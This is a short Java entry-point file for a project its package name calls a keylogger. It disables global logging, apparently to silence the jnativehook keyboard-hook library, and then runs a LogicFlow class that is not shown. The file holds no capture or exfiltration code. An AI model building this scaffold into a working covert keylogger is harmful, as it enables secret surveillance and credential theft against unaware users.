package com.mossad.keylogger;

import com.mossad.keylogger.logic.LogicFlow;
import org.jnativehook.NativeHookException;

import java.util.logging.Logger;
import java.util.logging.Level;

public class Main {

    public static void main(String [] args) throws NativeHookException {
        Logger.getGlobal().setLevel(Level.OFF);
        LogicFlow logicFlow = new LogicFlow();
        logicFlow.execute();
    }

}











